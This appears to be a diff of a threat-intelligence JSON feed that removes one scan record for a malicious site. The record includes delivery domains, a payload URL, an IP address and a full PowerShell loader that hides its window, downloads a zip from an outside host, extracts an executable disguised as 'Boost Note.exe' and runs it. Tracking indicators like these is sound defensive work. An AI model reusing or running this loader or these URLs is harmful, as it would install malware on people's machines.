@@ -7217,35 +7217,5 @@
     ],
     "ReportId": "cmwka3v651ee40omloaycbavs",
     "ScannedAt": "2026-11-17T05:55:44.668000+00:00"
-  },
-  {
-    "UrlDomain": "www.egypthologram.com",
-    "DeliveryUrl": [
-      "makeverizyjar.info",
-      "lovezramexar.info",
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "108.179.232.32"
-    ],
-    "Related": [
-      {
-        "Value": "https://makeverizyjar.info/api.php?s=9fee61d3c60417b2704fbe23c5b2abb636003abc2254fd89&amp;_v=29914869",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://lovezramexar.info/api.php?s=4a67ef89c0c750abf170c83e5a5922de63802862343d2c6b&amp;_v=29914869",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwk8idfi1dlf0omlmwtuzthg",
-    "ScannedAt": "2026-11-17T05:11:02.284000+00:00"
   }
 ]
